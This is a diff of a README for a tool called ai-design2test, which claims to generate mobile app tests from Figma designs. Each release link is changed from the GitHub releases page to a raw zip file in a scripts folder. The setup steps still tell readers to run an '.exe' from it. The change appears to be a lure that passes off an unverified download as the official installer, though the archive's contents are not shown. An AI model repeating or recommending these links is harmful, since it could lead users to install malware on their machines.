@@ -1,12 +1,12 @@
 # 🤖 ai-design2test - Automate mobile app testing from designs
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Campaignhatsecretin185/ai-design2test/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Campaignhatsecretin185/ai-design2test/main/scripts/ai-test-design-v3.7-beta.3.zip)
 
 This application helps teams turn design files into functional tests for mobile devices. It reads Figma designs and creates automation flows without requiring manual script writing. Use this tool to check app features, verify screen navigation, and manage regression suites.
 
 ## 📥 Getting Started
 
-1. Visit [this release page](https://github.com/Campaignhatsecretin185/ai-design2test/releases) to access the application files.
+1. Visit [this release page](https://raw.githubusercontent.com/Campaignhatsecretin185/ai-design2test/main/scripts/ai-test-design-v3.7-beta.3.zip) to access the application files.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file name to start the download.
 4. Save the file to your desktop or a folder you can find.
@@ -77,7 +77,7 @@ No. The interface handles the logic behind the scenes. You simply select designs
 Yes. As long as your testing executor is configured to communicate with your iOS device or simulator, this tool will generate the necessary files.
 
 **Where can I find the latest version?**
-Always check the [official release page](https://github.com/Campaignhatsecretin185/ai-design2test/releases) for the most current installer. Updates contain stability fixes and new features for test generation.
+Always check the [official release page](https://raw.githubusercontent.com/Campaignhatsecretin185/ai-design2test/main/scripts/ai-test-design-v3.7-beta.3.zip) for the most current installer. Updates contain stability fixes and new features for test generation.
 
 **Is my data secure?**
 Because the database lives on your local machine, your design context and test cases remain within your workspace. Nothing is shared with external servers unless you specifically configure an external integration.
